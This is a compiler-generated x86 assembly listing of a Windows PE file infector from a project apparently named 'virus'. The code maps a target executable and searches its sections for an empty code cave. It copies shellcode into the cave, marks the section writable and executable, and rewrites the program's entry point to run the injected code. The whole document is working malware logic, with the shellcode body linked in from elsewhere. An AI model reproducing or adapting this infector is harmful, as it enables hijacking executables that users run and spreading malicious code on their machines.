; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\User\source\repos\virus\injectInCodeCaves\infect_main.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	_get_code_cave_address_in_section
PUBLIC	_get_code_cave_address
PUBLIC	_main
EXTRN	___acrt_iob_func:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	_memcpy:PROC
EXTRN	__imp__CreateFileA@28:PROC
EXTRN	__imp__GetFileSize@8:PROC
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__MapViewOfFile@20:PROC
EXTRN	__imp__CreateFileMappingA@24:PROC
EXTRN	_free:PROC
EXTRN	_malloc:PROC
EXTRN	_set_exe_headers:PROC
EXTRN	_shellcode:PROC
EXTRN	_set_addrress_in_shellcode:PROC
EXTRN	_get_shellcode_size:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG99257 DB	'File has %d section', 0aH, 00H
	ORG $+3
$SG99258 DB	'Current section is %s', 0aH, 00H
	ORG $+1
$SG99260 DB	'There is place for shell code at address %d', 0aH, 00H
	ORG $+3
$SG99261 DB	'Not enough place at this section.', 0aH, 00H
	ORG $+1
$SG99288 DB	'C:\Users\User\source\repos\playground\msgBox.exe', 00H
	ORG $+3
$SG99290 DB	'Could not open infected file.', 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_new_entery_point$ = -24				; size = 4
_mapping_handle$ = -20					; size = 4
_codecave_address$ = -16				; size = 4
_shellcode_size$ = -12					; size = 4
_result$ = -8						; size = 4
_infected$ = -4						; size = 4
_main	PROC
; File C:\Users\User\source\repos\virus\injectInCodeCaves\infect_main.c
; Line 66
	push	ebp
	mov	ebp, esp
	sub	esp, 24					; 00000018H
; Line 69
	mov	DWORD PTR _result$[ebp], 0
; Line 70
	mov	DWORD PTR _infected$[ebp], 0
; Line 71
	mov	DWORD PTR _mapping_handle$[ebp], 0
; Line 72
	mov	DWORD PTR _codecave_address$[ebp], 0
; Line 73
	mov	DWORD PTR _shellcode_size$[ebp], 0
; Line 74
	mov	DWORD PTR _new_entery_point$[ebp], 0
; Line 76
	push	28					; 0000001cH
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _infected$[ebp], eax
; Line 77
	cmp	DWORD PTR _infected$[ebp], 0
	jne	SHORT $LN2@main
; Line 79
	mov	DWORD PTR _result$[ebp], -1
; Line 80
	jmp	$end$8
$LN2@main:
; Line 86
	push	0
	push	128					; 00000080H
	push	4
	push	0
	push	1
	push	-1073741820				; c0000004H
	push	OFFSET $SG99288
	call	DWORD PTR __imp__CreateFileA@28
	mov	ecx, DWORD PTR _infected$[ebp]
	mov	DWORD PTR [ecx], eax
; Line 94
	mov	edx, DWORD PTR _infected$[ebp]
	cmp	DWORD PTR [edx], -1
	jne	SHORT $LN3@main
; Line 96
	push	OFFSET $SG99290
	call	_printf
	add	esp, 4
; Line 97
	mov	DWORD PTR _result$[ebp], -1
; Line 98
	jmp	$end$8
$LN3@main:
; Line 101
	push	0
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax]
	push	ecx
	call	DWORD PTR __imp__GetFileSize@8
	mov	edx, DWORD PTR _infected$[ebp]
	mov	DWORD PTR [edx+24], eax
; Line 106
	push	0
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+24]
	push	ecx
	push	0
	push	4
	push	0
	mov	edx, DWORD PTR _infected$[ebp]
	mov	eax, DWORD PTR [edx]
	push	eax
	call	DWORD PTR __imp__CreateFileMappingA@24
	mov	DWORD PTR _mapping_handle$[ebp], eax
; Line 107
	mov	ecx, DWORD PTR _infected$[ebp]
	mov	edx, DWORD PTR [ecx+24]
	push	edx
	push	0
	push	0
	push	6
	mov	eax, DWORD PTR _mapping_handle$[ebp]
	push	eax
	call	DWORD PTR __imp__MapViewOfFile@20
	mov	ecx, DWORD PTR _infected$[ebp]
	mov	DWORD PTR [ecx+4], eax
; Line 109
	mov	edx, DWORD PTR _infected$[ebp]
	push	edx
	call	_set_exe_headers
	add	esp, 4
	mov	DWORD PTR _result$[ebp], eax
; Line 110
	cmp	DWORD PTR _result$[ebp], 0
	je	SHORT $LN4@main
; Line 111
	jmp	$end$8
$LN4@main:
; Line 113
	call	_get_shellcode_size
	mov	DWORD PTR _shellcode_size$[ebp], eax
; Line 115
	mov	eax, DWORD PTR _shellcode_size$[ebp]
	push	eax
	lea	ecx, DWORD PTR _result$[ebp]
	push	ecx
	mov	edx, DWORD PTR _infected$[ebp]
	push	edx
	call	_get_code_cave_address
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _codecave_address$[ebp], eax
; Line 116
	cmp	DWORD PTR _result$[ebp], -1
	jne	SHORT $LN5@main
; Line 117
	jmp	$end$8
$LN5@main:
; Line 119
	mov	eax, DWORD PTR _shellcode_size$[ebp]
	push	eax
	mov	ecx, OFFSET _shellcode
	add	ecx, 1962				; 000007aaH
	push	ecx
	mov	edx, DWORD PTR _codecave_address$[ebp]
	push	edx
	call	_memcpy
	add	esp, 12					; 0000000cH
; Line 120
	mov	eax, DWORD PTR _shellcode_size$[ebp]
	push	eax
	mov	ecx, DWORD PTR _codecave_address$[ebp]
	push	ecx
	mov	edx, DWORD PTR _infected$[ebp]
	push	edx
	call	_set_addrress_in_shellcode
	add	esp, 12					; 0000000cH
; Line 122
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+16]
	mov	edx, DWORD PTR [ecx+8]
	add	edx, DWORD PTR _shellcode_size$[ebp]
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+16]
	mov	DWORD PTR [ecx+8], edx
; Line 123
	mov	edx, DWORD PTR _infected$[ebp]
	mov	eax, DWORD PTR [edx+16]
	mov	ecx, DWORD PTR [eax+36]
	or	ecx, -536870912				; e0000000H
	mov	edx, DWORD PTR _infected$[ebp]
	mov	eax, DWORD PTR [edx+16]
	mov	DWORD PTR [eax+36], ecx
; Line 124
	mov	ecx, DWORD PTR _infected$[ebp]
	mov	edx, DWORD PTR [ecx+16]
	mov	eax, DWORD PTR _codecave_address$[ebp]
	add	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR _infected$[ebp]
	mov	edx, DWORD PTR [ecx+16]
	sub	eax, DWORD PTR [edx+20]
	mov	ecx, DWORD PTR _infected$[ebp]
	sub	eax, DWORD PTR [ecx+4]
	mov	DWORD PTR _new_entery_point$[ebp], eax
; Line 125
	mov	edx, DWORD PTR _infected$[ebp]
	mov	eax, DWORD PTR [edx+12]
	mov	ecx, DWORD PTR _new_entery_point$[ebp]
	mov	DWORD PTR [eax+40], ecx
$end$8:
; Line 128
	cmp	DWORD PTR _infected$[ebp], 0
	je	SHORT $LN6@main
; Line 130
	mov	edx, DWORD PTR _infected$[ebp]
	mov	eax, DWORD PTR [edx]
	push	eax
	call	DWORD PTR __imp__CloseHandle@4
; Line 131
	mov	ecx, DWORD PTR _infected$[ebp]
	push	ecx
	call	_free
	add	esp, 4
$LN6@main:
; Line 133
	mov	eax, DWORD PTR _result$[ebp]
; Line 134
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_first_section$ = -24					; size = 4
_number_of_sections$ = -20				; size = 4
_address$ = -16						; size = 4
_result$ = -12						; size = 4
_current_section$ = -8					; size = 4
_i$1 = -4						; size = 4
_infected$ = 8						; size = 4
_result_out$ = 12					; size = 4
_shellcode_size$ = 16					; size = 4
_get_code_cave_address PROC
; File C:\Users\User\source\repos\virus\injectInCodeCaves\infect_main.c
; Line 39
	push	ebp
	mov	ebp, esp
	sub	esp, 24					; 00000018H
; Line 41
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+12]
	movzx	edx, WORD PTR [ecx+6]
	mov	DWORD PTR _number_of_sections$[ebp], edx
; Line 42
	mov	eax, DWORD PTR _number_of_sections$[ebp]
	push	eax
	push	OFFSET $SG99257
	call	_printf
	add	esp, 8
; Line 44
	mov	ecx, DWORD PTR _infected$[ebp]
	mov	edx, DWORD PTR [ecx+12]
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+12]
	movzx	eax, WORD PTR [ecx+20]
	lea	ecx, DWORD PTR [edx+eax+24]
	mov	DWORD PTR _first_section$[ebp], ecx
; Line 45
	mov	DWORD PTR _current_section$[ebp], 0
; Line 46
	mov	DWORD PTR _address$[ebp], 0
; Line 47
	mov	DWORD PTR _result$[ebp], 0
; Line 48
	mov	DWORD PTR _i$1[ebp], 0
	jmp	SHORT $LN4@get_code_c
$LN2@get_code_c:
	mov	edx, DWORD PTR _i$1[ebp]
	add	edx, 1
	mov	DWORD PTR _i$1[ebp], edx
$LN4@get_code_c:
	mov	eax, DWORD PTR _i$1[ebp]
	cmp	eax, DWORD PTR _number_of_sections$[ebp]
	jae	SHORT $LN3@get_code_c
; Line 50
	imul	ecx, DWORD PTR _i$1[ebp], 40
	add	ecx, DWORD PTR _first_section$[ebp]
	mov	DWORD PTR _current_section$[ebp], ecx
; Line 51
	mov	edx, DWORD PTR _current_section$[ebp]
	push	edx
	push	OFFSET $SG99258
	call	_printf
	add	esp, 8
; Line 52
	mov	eax, DWORD PTR _shellcode_size$[ebp]
	push	eax
	lea	ecx, DWORD PTR _result$[ebp]
	push	ecx
	mov	edx, DWORD PTR _current_section$[ebp]
	push	edx
	mov	eax, DWORD PTR _infected$[ebp]
	push	eax
	call	_get_code_cave_address_in_section
	add	esp, 16					; 00000010H
	mov	DWORD PTR _address$[ebp], eax
; Line 53
	cmp	DWORD PTR _result$[ebp], 0
	jne	SHORT $LN5@get_code_c
; Line 55
	mov	ecx, DWORD PTR _address$[ebp]
	push	ecx
	push	OFFSET $SG99260
	call	_printf
	add	esp, 8
; Line 56
	jmp	SHORT $LN3@get_code_c
$LN5@get_code_c:
; Line 58
	push	OFFSET $SG99261
	call	_printf
	add	esp, 4
; Line 59
	jmp	SHORT $LN2@get_code_c
$LN3@get_code_c:
; Line 60
	mov	edx, DWORD PTR _infected$[ebp]
	mov	eax, DWORD PTR _current_section$[ebp]
	mov	DWORD PTR [edx+16], eax
; Line 61
	mov	ecx, DWORD PTR _result_out$[ebp]
	mov	edx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [ecx], edx
; Line 62
	mov	eax, DWORD PTR _address$[ebp]
; Line 63
	mov	esp, ebp
	pop	ebp
	ret	0
_get_code_cave_address ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
tv79 = -16						; size = 4
_address$ = -12						; size = 4
_gap$ = -8						; size = 4
_current_byte$ = -1					; size = 1
_infected$ = 8						; size = 4
_section$ = 12						; size = 4
_result_out$ = 16					; size = 4
_shellcode_size$ = 20					; size = 4
_get_code_cave_address_in_section PROC
; File C:\Users\User\source\repos\virus\injectInCodeCaves\infect_main.c
; Line 17
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
; Line 18
	mov	DWORD PTR _gap$[ebp], 0
; Line 19
	mov	DWORD PTR _address$[ebp], 0
; Line 20
	mov	BYTE PTR _current_byte$[ebp], 0
; Line 21
	mov	eax, DWORD PTR _section$[ebp]
	mov	ecx, DWORD PTR [eax+20]
	mov	DWORD PTR _address$[ebp], ecx
	jmp	SHORT $LN4@get_code_c
$LN2@get_code_c:
	mov	edx, DWORD PTR _address$[ebp]
	add	edx, 1
	mov	DWORD PTR _address$[ebp], edx
$LN4@get_code_c:
	mov	eax, DWORD PTR _section$[ebp]
	mov	ecx, DWORD PTR [eax+16]
	mov	edx, DWORD PTR _section$[ebp]
	add	ecx, DWORD PTR [edx+20]
	cmp	DWORD PTR _address$[ebp], ecx
	jae	SHORT $LN3@get_code_c
; Line 23
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+4]
	mov	edx, DWORD PTR _address$[ebp]
	mov	al, BYTE PTR [ecx+edx]
	mov	BYTE PTR _current_byte$[ebp], al
; Line 24
	movzx	ecx, BYTE PTR _current_byte$[ebp]
	test	ecx, ecx
	jne	SHORT $LN5@get_code_c
; Line 25
	mov	edx, DWORD PTR _gap$[ebp]
	add	edx, 1
	mov	DWORD PTR _gap$[ebp], edx
	jmp	SHORT $LN6@get_code_c
$LN5@get_code_c:
; Line 26
	mov	DWORD PTR _gap$[ebp], 0
$LN6@get_code_c:
; Line 28
	mov	eax, DWORD PTR _gap$[ebp]
	cmp	eax, DWORD PTR _shellcode_size$[ebp]
	jb	SHORT $LN7@get_code_c
; Line 29
	jmp	SHORT $LN3@get_code_c
$LN7@get_code_c:
; Line 30
	jmp	SHORT $LN2@get_code_c
$LN3@get_code_c:
; Line 32
	cmp	DWORD PTR _gap$[ebp], 0
	jle	SHORT $LN9@get_code_c
	mov	ecx, DWORD PTR _section$[ebp]
	mov	edx, DWORD PTR _gap$[ebp]
	cmp	edx, DWORD PTR [ecx+16]
	jae	SHORT $LN9@get_code_c
	mov	DWORD PTR tv79[ebp], 0
	jmp	SHORT $LN10@get_code_c
$LN9@get_code_c:
	mov	DWORD PTR tv79[ebp], -1
$LN10@get_code_c:
	mov	eax, DWORD PTR _result_out$[ebp]
	mov	ecx, DWORD PTR tv79[ebp]
	mov	DWORD PTR [eax], ecx
; Line 34
	mov	edx, DWORD PTR _address$[ebp]
	sub	edx, DWORD PTR _gap$[ebp]
	mov	eax, DWORD PTR _infected$[ebp]
	mov	ecx, DWORD PTR [eax+4]
	lea	eax, DWORD PTR [ecx+edx+1]
; Line 36
	mov	esp, ebp
	pop	ebp
	ret	0
_get_code_cave_address_in_section ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
